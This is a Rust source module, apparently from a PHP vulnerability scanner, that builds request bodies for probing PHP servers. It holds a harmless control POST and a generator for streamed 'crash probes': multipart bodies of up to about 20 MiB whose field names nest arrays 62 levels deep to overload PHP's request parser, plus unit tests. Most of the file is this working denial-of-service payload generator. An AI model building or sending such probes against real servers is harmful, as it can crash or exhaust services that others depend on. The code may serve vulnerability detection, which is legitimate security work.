//! PHP request bodies.
//!
//! Two kinds: the **benign control** (a minimal valid multipart POST, used only
//! to read the baseline and the version header) and the **heavy crash probes**
//! (deeply-nested multipart, ~1→20 MiB, streamed so a full body is never held in
//! RAM per worker). The probes are original, built from the documented
//! parameters (nesting depth, size), not copied from any tool.

use bytes::Bytes;

use crate::core::http::{ChunkedBody, HttpRequest, StreamingRequest};

/// Multipart boundary for the control body (fixed, benign).
pub const CONTROL_BOUNDARY: &str = "x2shellControlBoundary";
/// Multipart boundary for the heavy probes.
pub const PROBE_BOUNDARY: &str = "x2shellProbeBoundary";
/// phpMyAdmin marker in a control response → retarget. Reference const for
/// the special case, applied by the detector.
pub const PHPMYADMIN_MARKER: &[u8] = b"phpMyAdmin";

/// Field-array nesting depth of each probe part.
pub const NESTING_DEPTH: usize = 62;
/// Target body sizes for the up-to-3 probes, growing ~1 → ~20 MiB.
/// Actual bytes land just under each target (whole number of parts + closer).
pub const PROBE_SIZES: [usize; 3] = [1 << 20, 8 << 20, 20 << 20];
/// Fixed decimal width of each part's leaf index, so every part has the same
/// length and the exact body size is computable up front (for Content-Length).
const INDEX_WIDTH: usize = 10;
/// Bytes coalesced per streamed frame (keeps the wire efficient without holding
/// the whole body: peak RAM ≈ one frame).
const CHUNK_TARGET: usize = 64 * 1024;

/// A minimal valid multipart POST: one small field. Harmless; it exists only
/// to read the baseline and the version header, never to stress the parser.
pub fn control_request() -> HttpRequest {
    let b = CONTROL_BOUNDARY;
    let body =
        format!("--{b}\r\nContent-Disposition: form-data; name=\"x\"\r\n\r\nv\r\n--{b}--\r\n");
    HttpRequest {
        method: "POST".into(),
        headers: vec![(
            "Content-Type".into(),
            format!("multipart/form-data; boundary={CONTROL_BOUNDARY}"),
        )],
        body: body.into_bytes(),
    }
}

/// Constant prefix of every probe part, up to (not including) the leaf index:
/// `--BOUNDARY\r\nContent-Disposition: form-data; name="f[0][0]…[` with
/// `NESTING_DEPTH - 1` `[0]` groups, then the open bracket for the varying leaf.
fn part_prefix() -> String {
    let nest = "[0]".repeat(NESTING_DEPTH - 1);
    format!("--{PROBE_BOUNDARY}\r\nContent-Disposition: form-data; name=\"f{nest}[")
}

/// Suffix after the leaf index: close the key, blank line, one-byte value, CRLF.
const PART_SUFFIX: &str = "]\"\r\n\r\nX\r\n";

/// Closing multipart boundary.
fn closer() -> Vec<u8> {
    format!("--{PROBE_BOUNDARY}--\r\n").into_bytes()
}

/// A heavy multipart probe targeting ~`target_size` bytes, streamed. Each part
/// declares a 62-level-nested field-array key with a distinct leaf, so the
/// parser builds many deep structures; repeated until the size target is met.
pub fn probe_request(target_size: usize) -> StreamingRequest {
    let prefix = part_prefix();
    let part_len = prefix.len() + INDEX_WIDTH + PART_SUFFIX.len();
    let closer = closer();

    // Whole number of parts that fits under the target (at least one).
    let budget = target_size.saturating_sub(closer.len());
    let n_parts = (budget / part_len).max(1);
    let total = n_parts * part_len + closer.len();

    let parts_per_chunk = (CHUNK_TARGET / part_len).max(1);
    let closer_frame = Bytes::from(closer);

    let mut idx = 0usize;
    let mut closed = false;
    let chunks = std::iter::from_fn(move || {
        if idx < n_parts {
            let end = (idx + parts_per_chunk).min(n_parts);
            let mut buf = Vec::with_capacity((end - idx) * part_len);
            let w = INDEX_WIDTH;
            for i in idx..end {
                buf.extend_from_slice(prefix.as_bytes());
                // Fixed-width index keeps every part exactly `part_len` bytes.
                buf.extend_from_slice(format!("{i:0w$}").as_bytes());
                buf.extend_from_slice(PART_SUFFIX.as_bytes());
            }
            idx = end;
            Some(Bytes::from(buf))
        } else if !closed {
            closed = true;
            Some(closer_frame.clone())
        } else {
            None
        }
    });

    StreamingRequest {
        method: "POST".into(),
        headers: vec![(
            "Content-Type".into(),
            format!("multipart/form-data; boundary={PROBE_BOUNDARY}"),
        )],
        body: ChunkedBody::new(total as u64, chunks),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use hyper::body::Body;

    #[test]
    fn control_is_a_small_valid_multipart_post() {
        let r = control_request();
        assert_eq!(r.method, "POST");
        let ct = r
            .headers
            .iter()
            .find(|(k, _)| k.eq_ignore_ascii_case("content-type"))
            .map(|(_, v)| v.as_str())
            .unwrap();
        assert!(ct.contains("multipart/form-data"));
        assert!(ct.contains(CONTROL_BOUNDARY));
        // Small, bounded, and well-formed (opens and closes with the boundary).
        assert!(r.body.len() < 256);
        let body = String::from_utf8(r.body).unwrap();
        assert!(body.starts_with(&format!("--{CONTROL_BOUNDARY}")));
        assert!(body.ends_with(&format!("--{CONTROL_BOUNDARY}--\r\n")));
    }

    /// Drain a probe body, returning the concatenated bytes and the declared
    /// exact length from its `size_hint`.
    fn drain(mut req: StreamingRequest) -> (Vec<u8>, u64) {
        use std::task::{Context, Poll};
        let declared = req.body.size_hint().exact().expect("exact content length");
        let mut cx = Context::from_waker(std::task::Waker::noop());
        let mut out = Vec::new();
        loop {
            match std::pin::Pin::new(&mut req.body).poll_frame(&mut cx) {
                Poll::Ready(Some(Ok(frame))) => {
                    if let Some(d) = frame.data_ref() {
                        out.extend_from_slice(d);
                    }
                }
                Poll::Ready(None) => break,
                // The body is a sync iterator: it never returns Pending or Err.
                _ => unreachable!("probe body is synchronous and infallible"),
            }
        }
        (out, declared)
    }

    #[test]
    fn probe_body_streams_exactly_its_declared_length() {
        // Use the smallest size so the test stays fast; the arithmetic is the same.
        let (bytes, declared) = drain(probe_request(PROBE_SIZES[0]));
        assert_eq!(
            bytes.len() as u64,
            declared,
            "streamed bytes must match Content-Length"
        );
        assert!(bytes.starts_with(format!("--{PROBE_BOUNDARY}").as_bytes()));
        assert!(bytes.ends_with(format!("--{PROBE_BOUNDARY}--\r\n").as_bytes()));
        // 62-level nesting present (61 "[0]" groups + a varying leaf).
        assert!(bytes.windows(3).filter(|w| *w == b"[0]").count() >= NESTING_DEPTH - 1);
    }

    #[test]
    fn probe_body_has_at_least_one_part_even_when_tiny() {
        let (bytes, _) = drain(probe_request(1));
        assert!(bytes
            .windows(PROBE_BOUNDARY.len())
            .any(|w| w == PROBE_BOUNDARY.as_bytes()));
    }
}
